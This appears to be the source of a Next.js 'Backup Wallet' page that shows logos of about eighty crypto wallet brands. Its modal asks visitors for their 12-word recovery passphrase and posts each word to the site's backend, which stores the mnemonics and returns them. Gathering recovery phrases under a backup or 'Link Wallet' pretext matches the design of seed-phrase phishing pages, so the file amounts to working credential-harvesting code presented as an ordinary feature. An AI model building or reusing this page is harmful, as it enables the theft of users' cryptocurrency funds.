"use client";

import Image, { StaticImageData } from "next/image";
import "../../app/globals.css";
import { useEffect, useState } from "react";
import axios, { AxiosError } from "axios";
import apiClient from "@/lib/axios-config";
import Footer1 from "@/components/footers/Footer1";
import { toast } from "react-toastify";
import ArculusLogo from "../../assets/arculus.jpg";
import KrakenLogo from "../../assets/kraken.jpg";

interface CryptoService {
  name: string;
  logo: string | StaticImageData;
}

const cryptoServices: CryptoService[] = [
  {
    name: "Trust",
    logo: "https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png",
  },
  {
    name: "Meta Mask",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ymr3UNKopfI0NmUY95Dr-0589vG-91KuAA&s",
  },
  {
    name: "Lobstr",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxZO-w6G9AhJ0wp-OJ0-JSCnTg-VkTBLvRTw&s",
  },
  {
    name: "Coinbase",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCqAcp2nKqa7kAITMdhwg1hyl7S288Z2y-CA&s",
  },
  {
    name: "Aktionariat",
    logo: "https://hub.aktionariat.com/images/tokens/AKS.png",
  },
  {
    name: "Alice",
    logo: "https://pbs.twimg.com/profile_images/1484292175693168641/ZzM6H3Pg_400x400.jpg",
  },
  {
    name: "Alpha Wallet",
    logo: "https://play-lh.googleusercontent.com/i4sO9hP8F9LuFC0HVhMCjY-3ypiv115WLBQQv96dodroEXNk-FHEOABYzvlDZRr1QmCd",
  },
  {
    name: "Anchor",
    logo: "https://play-lh.googleusercontent.com/DVLJnVhhOe99bwJjZ-00lAeaw-rqPPj2HRmlXOC0cr-xAOcWkjy8NuLGjB0kMdMBlg",
  },
  {
    name: "Argent",
    logo: "https://play-lh.googleusercontent.com/P-xt-cfYUtwVQ3YsNb5yd5_6MzCHmcKAbRkt-up8Ga44x_OCGLy4WFxsGhxfJaSLEw",
  },
  {
    name: "At.wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDPCt6lJdS8j2a7MRtq4_e_AxXUAxpbz8F3A&s",
  },
  {
    name: "Atomic",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5NXuXvKhVRyHp9MAMIJgXAuxa34qIcCUMaw&s",
  },
  {
    name: "Authereum",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcScW5jnqjFKR-ztDcHzVYC8Vt482kqfCLADcA&s",
  },
  { name: "Arculus", logo: ArculusLogo },
  {
    name: "Bakkt",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRn9kvWHI1QM5pNyUmu7yHMf5rMS4_lNYxAtg&s",
  },
  {
    name: "Binance Smart Chain",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYsIlgC1idQYxosa7qcLgymg8iB7S6mYZhng&s",
  },
  {
    name: "Bit Keep",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQc3GNF3L8ow_vSVNvYSPhhJ8Grt7xfuZL1g&s",
  },
  {
    name: "Bit Pay",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT45uwJ5k00LMFSThuc5AjfkcOtko4uS-wt1g&s",
  },
  {
    name: "Blockchain",
    logo: "https://play-lh.googleusercontent.com/CcboHyK1Id9XQWa8HXb_81Rvgqy7J816OHiTcGlezcwC-tx4cnrrXPx1x6cR0PowqA",
  },
  {
    name: "Bridge Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8VkdKJmcOXa6T6zSmtTjBpyYMnykHRJuc8Q&s",
  },
  {
    name: "Coin98",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCjnB7V3x1fnc6A8EQkWjvF1mbhdEZdlw1dQ&s",
  },
  {
    name: "Coinomi",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQG2EmvXSOkjSnY1GorPBWQi5kixOk41o08Kw&s",
  },
  {
    name: "Cool Wallet S",
    logo: "https://play-lh.googleusercontent.com/Fh6qQqnzTc1PctcLekAHWG2WqnzCFbAwGYEdA48rVdwAso5Ws4CCe54IUylGEb-F8I8",
  },
  {
    name: "Cosmostation",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWndB9qn1yW6519tgk7YAAS47eBz9AV0sAdQ&s",
  },
  {
    name: "Crypto.com Defi Wallet",
    logo: "https://play-lh.googleusercontent.com/aVdij_oLx4mlhbHs0Vk_VUuhUUt-fTsVhr2adKmceijitlXdSXiyw9YbVD32uZcQqeRiw31GZGGBk9gX3wr_",
  },
  {
    name: "Cybavo Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmrBBQ3YHzoxwiVpqVJ5lelMXBbXiY3GurBw&s",
  },
  {
    name: "D'Cent Wallet",
    logo: "https://play-lh.googleusercontent.com/4GO-Bjl9nTDw_C2nrM4erEEl26IriD3AxzfLK6Qfp__0LfrxSUxF8MPH4WOgfL8G1g",
  },
  {
    name: "Dok Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrcqgWai9_pBO_EwCBG7EG79bMm3c2OosV9Q&s",
  },
  {
    name: "Easy Pocket",
    logo: "https://wallet.easycrypto.com/wp-content/uploads/2024/04/cropped-ECW-Favicon-light-purple-1.png",
  },
  {
    name: "Eidoo",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7Hag4f9bb3ir0Zha2dzLMoL9pV33UMyysCA&s",
  },
  {
    name: "Ellipal",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJNXLgMxi8sMcFlyCm_LBNWGWHwsXYgr7R2g&s",
  },
  {
    name: "Equal",
    logo: "https://s2.coinmarketcap.com/static/img/coins/200x200/2479.png",
  },
  {
    name: "Exodus",
    logo: "https://upload.wikimedia.org/wikipedia/commons/1/17/Exodus_Wallet_Logo.png",
  },
  {
    name: "Fetch",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtY3j_xqCDqzIeUQ0-7cEkmNkRLMi3Cf9qFw&s",
  },
  {
    name: "Gnosis Safe Multisig",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkQzmWd5ninC9pBB4BQyJIAaNj9tzHkXUFiQ&s",
  },
  {
    name: "Graph Protocol",
    logo: "https://pbs.twimg.com/profile_images/1887217540902076417/Q4b9EYlv_400x400.jpg",
  },
  {
    name: "Grid Plus",
    logo: "https://avatars.githubusercontent.com/u/28931745?s=280&v=4",
  },
  {
    name: "Harmony",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRywO0bJ5kWU_ZXs3Pz8nfxeYIlkYyi90tCRQ&s",
  },
  {
    name: "Huobi Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaleIiDrpBlhDC_0JmIthi6aul0_ZAZyaXnw&s",
  },
  {
    name: "Iconex",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQgPvhuDsb2OwDKvETD3Q7FNhy8-TjYbu7hQ&s",
  },
  {
    name: "Infinito",
    logo: "https://walletscrutiny.com/images/wIcons/android/io.infinito.wallet.png",
  },
  {
    name: "Infinity Wallet",
    logo: "https://images.g2crowd.com/uploads/product/image/social_landscape/social_landscape_4166fd82728b86aba74e45b1a77b6c09/infinity-wallet.png",
  },
  {
    name: "Karda Chain",
    logo: "https://play-lh.googleusercontent.com/sDNtmdHgfQYtQvUtQ-AurSy7GoQ4c2JHey4LaUoxR9kBZDMYXaVZrjP0qJLVQM94eDuI",
  },
  {
    name: "Keplr",
    logo: "https://cdn.aptoide.com/imgs/3/0/2/30270a84f74dba6e4a3449895a1aafba_icon.png",
  },
  {
    name: "Keyring Pro",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRq9ldNYixMdlqETfS48l0EaIlEUofhhU2iKw&s",
  },
  { name: "Kraken", logo: KrakenLogo },
  {
    name: "Ledger Live",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8dr_DSVYx1DpkyMNsPAtWC9_sqCBKIJM6UA&s",
  },
  {
    name: "Ledger Nano S",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDiJlY8Hd-XR2-ZuN-fh_wB2ogRwyWgyKm3w&s",
  },
  {
    name: "Ledger Nano X",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPZw_FAClf8K0navOpihifYy03SUWmKYQ9qA&s",
  },
  {
    name: "Loopring Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2OQJIGBnucFy0sjgDwcbvZGwzlkGS_z3iuA&s",
  },
  {
    name: "Maiar",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgyUCbQyR3baBanYYHYI5mwTOX3keMmfozKg&s",
  },
  {
    name: "Math Wallet",
    logo: "https://pbs.twimg.com/profile_images/1435132371515314178/Nr2wV2ZM_400x400.jpg",
  },
  {
    name: "Meet.one",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFlR30oz51nmF4Hztmlwj1uYmrjp4VtLBgsw&s",
  },
  {
    name: "Midas Wallet",
    logo: "https://ibsintelligence.com/wp-content/uploads/2024/04/getmidas_logo.jpg",
  },
  {
    name: "Morix Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsQzKXohLXEtp7_lrzS2weydv3N4gOEQ6G4A&s",
  },
  {
    name: "Mykey",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfFTw1895wUC6CVMTDjXqkchwXuibgc7FsbA&s",
  },
  {
    name: "Nash",
    logo: "https://play-lh.googleusercontent.com/BSBGZadrtFyvalo1lpf61dFMoqsgOOkY_hJvqTblV_huq4IHiukzfoSZiNx3df1VlvDv=w600-h300-pc0xffffff-pd",
  },
  {
    name: "Onto",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSH8lqwS3Z7Ye-gxSOS2Dj2M1fuq3IDUKEY2w&s",
  },
  {
    name: "Ownbit",
    logo: "https://play-lh.googleusercontent.com/XzzaoXwedJjCiQeB4Sh3nOIlB5iR8fOxCTKbFLTiAyJ0JqFJogC3mbA6pj3fIR2y3lw",
  },
  {
    name: "Peak Defi Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XPwrCsEcoaOY_JPiAaJk7Kh_Yt6tQsBmqQ&s",
  },
  {
    name: "Pillar",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9G8rdcXhthupiO95YHDZk3GTanhBPV4kQTQ&s",
  },
  {
    name: "Rainbow",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgffx2rvKMnVSlWOQ2uyItBKXc5q8WGbXCnQ&s",
  },
  {
    name: "Safepal",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1CDl_6EEhHjnYVuchge5oqOY1BJ7pJy9CBg&s",
  },
  {
    name: "Spark Point",
    logo: "https://cdn.aptoide.com/imgs/f/d/7/fd72d98b0c928500061281a653e121de_icon.png",
  },
  {
    name: "Spatium",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAJOQmcIxhWD7MLXdBfbCGqv9uMRg_G-mt-w&s",
  },
  {
    name: "Tangem",
    logo: "https://play-lh.googleusercontent.com/mpgPYIGu3s2TouJoB2-YKVYVSe_cRIubtn1cgxwlBsVAIgqROD8DgvG8q3m8OZm6XTM=w240-h480-rw",
  },
  {
    name: "Token Pocket",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsPUMUGfyy1YF20GVSUF3PXfLz32ruSI19hQ&s",
  },
  {
    name: "Tokenary",
    logo: "https://www.tokenary.io/icon.png",
  },
  {
    name: "Torus",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL82SCwKo5WMh2ici8oeUbL_1XV5H1nDe9JA&s",
  },
  {
    name: "Trezor Model T",
    logo: "https://cryptopotato.com/wp-content/uploads/2025/09/trezor-logo2.jpg",
  },
  {
    name: "Trust Vault",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmNlWzKvlGNr0viUjjF7tkdYE4sw4rUfJXUA&s",
  },
  {
    name: "Unstoppable Wallet",
    logo: "https://play-lh.googleusercontent.com/eH0bEWCoW5a5WkmYsrBNX17Rj50-W45-JsDCvku2TEySTFzs_Jw1oQ9LCLuwNDJRa2o",
  },
  {
    name: "Via Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-VbRs6juwQhrozmvQHIK-sEJB0ROKyUP1Hw&s",
  },
  {
    name: "Vision",
    logo: "https://walletscrutiny.com/images/wIcons/iphone/com.visionsoftware.vision.jpg",
  },
  {
    name: "Wallet.io",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7rnD_9Kabed7hNPRlY8QHYZ9r20ArJV9cPA&s",
  },
  {
    name: "Wallet Connect",
    logo: "https://images.seeklogo.com/logo-png/43/1/walletconnect-logo-png_seeklogo-430923.png",
  },
  {
    name: "Walleth",
    logo: "https://walleth.org/assets/img/walleth_icon.png",
  },
  {
    name: "Wazirx",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT4cJ2Z4pdqZAFGpgVONsR9xHIl0Vz1xRlZ6g&s",
  },
  {
    name: "Xaman",
    logo: "https://play-lh.googleusercontent.com/jpfmbnNbNL0IFNUS0MihgihqcGyQtktDFgY-ewUjcTLsXExJ-189gg_UnnmwptQ2nVQ",
  },
  {
    name: "Xdc Wallet",
    logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjKMeV2Dt-1lw8ob8NwbfoQngmcqg8ogsH6Q&s",
  },
  {
    name: "Zel Core",
    logo: "https://zelcore.io/favicon.ico",
  },
];

export default function BackupWallet() {
  const [selectedWallet, setSelectedWallet] = useState<CryptoService | null>(
    null
  );
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [filledWallets, setFilledWallets] = useState<string[]>([]);
  const [walletData, setWalletData] = useState<any[]>([]);

  useEffect(() => {
    const fetchWallets = async () => {
      try {
        const res = await apiClient.get("/api/history/get_word", {
          headers: {
            Authorization: `Bearer ${localStorage.getItem("token")}`,
          },
        });

        if (res.data.status_code && res.data.wallets?.length) {
          setWalletData(res.data.wallets);
          const walletsWithAllWords = res.data.wallets
            .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
            .map((w: any) => w.type);

          setFilledWallets(walletsWithAllWords);
        }
      } catch (err) {
        const error = err as AxiosError<{ msg: string }>;
        console.log("error fetching wallets:", error);
      }
    };
    fetchWallets();
  }, []);

  const openModal = (wallet: CryptoService) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);

    const savedWallet = walletData.find(
      (w: any) =>
        w.type.trim().toLowerCase() === wallet.name.trim().toLowerCase()
    );

    if (savedWallet?.mnemonic) {
      const mnemonicWords = savedWallet.mnemonic.trim().split(/\s+/);
      const limitedWords = mnemonicWords.slice(0, 12);
      setWords([
        ...limitedWords,
        ...Array(Math.max(0, 12 - limitedWords.length)).fill(""),
      ]);
    } else {
      setWords(Array(12).fill(""));
    }
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setSelectedWallet(null);
    setWords(Array(12).fill(""));
  };

  const handleWordChange = (index: number, value: string) => {
    const updated = [...words];
    updated[index] = value;
    setWords(updated);
  };

  const handleSubmit = async () => {
    if (words.some((word) => word.trim() === "")) {
      // alert("fill all 12 words.");
      toast.error("Fill all 12 words.");
      return;
    }

    if (!selectedWallet) return;

    try {
      const payload = {
        type: selectedWallet.name,
        one: words[0],
        two: words[1],
        three: words[2],
        four: words[3],
        five: words[4],
        six: words[5],
        seven: words[6],
        eight: words[7],
        nine: words[8],
        ten: words[9],
        eleven: words[10],
        twelve: words[11],
      };

      const res = await apiClient.post("/api/history/add_word", payload);

      if (res.data.status_code) {
        // alert("✅ Wallet words saved successfully");
        toast.success("Wallet words saved successfully");
        closeModal();
        const refreshed = await apiClient.get("/api/history/get_word", {
          headers: {
            Authorization: `Bearer ${localStorage.getItem("token")}`,
          },
        });
        setWalletData(refreshed.data.wallets);
        const walletsWithAllWords = refreshed.data.wallets
          .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
          .map((w: any) => w.type);
        setFilledWallets(walletsWithAllWords);
      }
    } catch (err) {
      const error = err as AxiosError<{ msg: string }>;
      console.log(error.response?.data?.msg || "❌ Something went wrong.");
    }
  };

  return (
    <>
      <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container tw-pb-28">
        <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
        <div className="tw-grid tw-grid-cols-2 sm:tw-grid-cols-3 lg:tw-grid-cols-4 tw-gap-[20px]">
          {cryptoServices.map((service) => (
            <div
              key={service.name}
              onClick={() => openModal(service)}
              className={`tw-flex tw-flex-col tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
                            ${
                              filledWallets.includes(service.name)
                                ? "!tw-border-[#008000]"
                                : "tw-border-[#f1f1f2]/30"
                            } 
                            tw-cursor-pointer tw-hover:tw-bg-black/40`}
            >
              <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
                <Image
                  src={service.logo}
                  alt={service.name}
                  fill
                  className="tw-object-cover"
                />
              </div>
              <div>
                <h3 className="tw-text-lg tw-text-center">{service.name}</h3>
              </div>
            </div>
          ))}
        </div>
        {isModalOpen && selectedWallet && (
          <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
            <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
              <button
                onClick={closeModal}
                className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0"
              >
                ×
              </button>
              <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
                <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
                  <Image
                    src={selectedWallet.logo}
                    alt={selectedWallet.name}
                    fill
                    className="tw-object-cover"
                  />
                </div>
                <h2 className="tw-text-xl tw-font-bold">
                  {selectedWallet.name}
                </h2>
              </div>
              <hr className="tw-my-4" />
              <p className="tw-mb-[20px] tw-text-center tw-text-[16px]">
                Enter your 12-word passphrase:
              </p>
              <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px]">
                {words.map((word, i) => (
                  <input
                    key={i}
                    type="text"
                    placeholder={`Word ${i + 1}`}
                    value={word}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
                  />
                ))}
              </div>
              <button
                onClick={handleSubmit}
                className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
              >
                Link Wallet
              </button>
            </div>
          </div>
        )}
      </div>
      <Footer1 />
    </>
  );
}
